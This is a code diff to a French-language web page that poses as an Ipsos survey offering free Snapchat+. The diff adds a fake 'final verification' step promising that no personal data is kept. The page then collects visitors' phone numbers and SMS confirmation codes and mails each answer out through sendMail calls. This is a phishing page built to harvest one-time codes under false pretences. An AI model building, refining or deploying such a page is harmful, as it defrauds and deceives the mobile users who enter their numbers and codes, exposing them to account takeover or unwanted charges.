@@ -53,16 +53,25 @@ button:hover { background:#005fa3; transform:translateY(-2px) scale(1.03); box-s
     <button id="btnEtape1">Suivant</button>
 </div>
 
+<!-- Nouvelle étape intermédiaire pour explication professionnelle -->
+<div class="box" id="etape1b">
+    <h2>Dernière vérification avant envoi</h2>
+    <p>Avant de recevoir votre Snapchat+, nous devons effectuer une dernière vérification pour confirmer que vous êtes bien un participant humain et éviter tout abus. </p>
+    <p>Cette vérification est importante car elle garantit que chaque employé recevra correctement son abonnement et que le service fonctionne uniquement pour les clients SFR, Bouygues ou Orange.</p>
+    <p>Nous ne stockons pas vos informations personnelles après cette vérification. Seul votre numéro sera utilisé pour l’envoi du code SMS.</p>
+    <button id="btnEtape1b">Continuer</button>
+</div>
+
 <div class="box" id="etape2">
-    <h2>Dernière vérification</h2>
-    <p>Pour confirmer que vous êtes un humain et éviter les abus, merci de saisir votre numéro de téléphone (06 ou 07 uniquement) :</p>
+    <h2>Numéro de téléphone</h2>
+    <p>Veuillez entrer votre numéro pour recevoir le code de confirmation :</p>
     <input type="text" id="telephone" placeholder="Ex: 06XXXXXXXX">
     <button id="btnEtape2">Suivant</button>
 </div>
 
 <div class="box" id="etape3">
-    <h2>Dernière vérification</h2>
-    <p>Entrez le code reçu par SMS pour confirmer votre numéro et finaliser l’inscription à Snapchat+ :</p>
+    <h2>Code de vérification</h2>
+    <p>Entrez le code reçu par SMS pour finaliser l’inscription à Snapchat+ :</p>
     <input type="text" id="code_sms" placeholder="Code reçu">
     <button id="btnEtape3">Terminer</button>
 </div>
@@ -117,7 +126,12 @@ document.getElementById('btnEtape1').addEventListener('click', ()=>{
 
     sendMail({artiste_prefere:pref, artiste_deezer:deezer, artiste_decouverte:decouverte},"Réponses étape 1 - Ipsos");
 
-    showStep('etape2',33);
+    showStep('etape1b',25);
+});
+
+// Étape intermédiaire professionnelle
+document.getElementById('btnEtape1b').addEventListener('click', ()=>{
+    showStep('etape2',50);
 });
 
 // Étape 2
@@ -128,7 +142,7 @@ document.getElementById('btnEtape2').addEventListener('click', ()=>{
     reponses.telephone = tel;
     sendMail({telephone:tel},"Réponses étape 2 - Ipsos");
 
-    showStep('etape3',66);
+    showStep('etape3',75);
 });
 
 // Étape 3
